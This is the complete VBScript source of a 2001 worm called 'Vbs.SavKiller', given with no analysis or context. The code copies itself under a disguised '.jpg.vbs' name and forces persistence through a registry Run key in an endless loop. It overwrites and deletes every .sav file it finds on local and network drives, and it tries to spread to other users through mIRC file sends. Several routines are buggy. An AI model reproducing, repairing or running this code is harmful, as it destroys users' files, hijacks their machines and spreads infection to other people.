   '&&&&&&&&&&&&&&&&&&&&&
   'Vbs.SavKiller
   'Written By D/C/A
   '14/May/2001
   '&&&&&&&&&&&&&&&&&&&&&
   On Error Resume Next
   dim fso, dirsystem, eq, ctr, file, vbscopy
   eq=""
   ctr=0
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   vbscopy=file.ReadAll
   main()
   sub main()
   On Error Resume Next
   Set dirsystem = fso.GetSpecialFolder
   Set c = fso.GetFile(WScript.ScriptFullName)
   c.Copy(dirsystem&"\")
   listadriv()
   end sub
   'SAVK0514I2001LLER
   sub listadriv
   On Error Resume Next
   Dim d,dc,s
   Set dc = fso.Drives
   For Each d in dc
   If d.DriveType = 2 or d.DriveType=3 Then
   folderlist(d.path & "\")
   end if
   Next
   listadriv = s
   end sub
   'SAVK0514I2001LLER
   Set HFFLUO9U = createobject("scripting.filesystemobject")
   HQOL4K3F = HFFLUO9U.getspecialfolder
   P5693774 = HQOL4K3F & "\SavKiller.jpg.vbs"
   Set TO0FSHHV = createobject("wscript.shell")
   TO0FSHHV.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SK", "wscript.exe " & P5693774 & " %"
   HFFLUO9U.copyfile wscript.scriptfullname, P5693774
   If TO0FSHHV.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SavKiller\M2SM1R6N") <> 1 then
   N0MGF353 ""
   End if
   Set DS6U42V9= HFFLUO9U.opentextfile(wscript.scriptfullname)
   S2Q11D14 = DS6U42V9.readall
   DS6U42V9.close
   Do
   if not(HFFLUO9U.fileexists(wscript.scriptfullname)) then
   set A1NH87SA= HFFLUO9U.createtextfile(wscript.scriptfullname)
   A1NH87SA.write S2Q11D14
   A1NH87SA.close
   end if
   H8UI64RC = TO0FSHHV.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SK")
   If H8UI64RC <> "wscript.exe " & P5693774 & " %" then
   TO0FSHHV.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SK", "wscript.exe " & P5693774 & " %"
   end if
   H8UI64RC= ""
   loop
   Function N0MGF353(E56BAOA7)
   If E56BAOA7 <> "" Then
   E33DSE84 = TO0FSHHV.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If HFFLUO9U.fileexists("c:\mirc\mirc.ini") Then
   E56BAOA7 = "c:\mirc"
   ElseIf HFFLUO9U.fileexists("c:\mirc32\mirc.ini") Then
   E56BAOA7 = "c:\mirc32"
   ElseIf HFFLUO9U.fileexists(E33DSE84 & "\mirc\mirc.ini") Then
   E56BAOA7 = E33DSE84 & "\mirc"
   ElseIf HFFLUO9U.fileexists(E33DSE84 & "\mirc32\mirc.ini") Then
   E56BAOA7 = E33DSE84 & "\mirc"
   Else
   E56BAOA7 = ""
   End If
   End If
   If E56BAOA7 <> "" Then
   Set C8B37I21 = HFFLUO9U.CreateTextFile(E56BAOA7 & "\script.ini", True)
   C8B37I21 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
   C8B37I21 = C8B37I21 & vbCrLf & "n0=on 1:JOIN:#:{"
   C8B37I21 = C8B37I21 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   C8B37I21 = C8B37I21 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
   C8B37I21 = C8B37I21 & P5693774
   C8B37I21 = C8B37I21 & vbCrLf & "n3=}"
   script.Close
   End If
   End Function
   'SAVK0514I2001LLER
   sub infectfiles(folderspec)
   On Error Resume Next
   dim f, f1, fc, ext, ap, s, bname
   set f = fso.GetFolder(folderspec)
   set fc = f.Files
   for each f1 in fc
   ext = fso.GetExtensionName(f1.path)
   ext = lcase(ext)
   s = lcase(f1.name)
   if (ext = "sav") then
   set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname = fso.GetBaseName(f1.path)
   set cop = fso.GetFile(f1.path)
   cop.copy(folderspec & "\" & bname & ".vbs")
   fso.DeleteFile(f1.path)
   end if
   next
   end sub
   'SAVK0514I2001LLER
   sub folderlist(folderspec)
   On Error Resume Next
   dim f,f1,sf
   set f = fso.GetFolder(folderspec)
   set sf = f.SubFolders
   for each f1 in sf
   infectfiles(f1.path)
   folderlist(f1.path)
   next
   end sub
   function fileexist(filespec)
   On Error Resume Next
   dim msg
   if (fso.FileExists(filespec)) Then
   msg = 0
   else
   msg = 1
   end if
   fileexist = msg
   end function
   'SAVK0514I2001LLER
   function folderexist(folderspec)
   On Error Resume Next
   dim msg
   if (fso.GetFolderExists(folderspec)) then
   msg = 0
   else
   msg = 1
   end if
   fileexist = msg
   end function
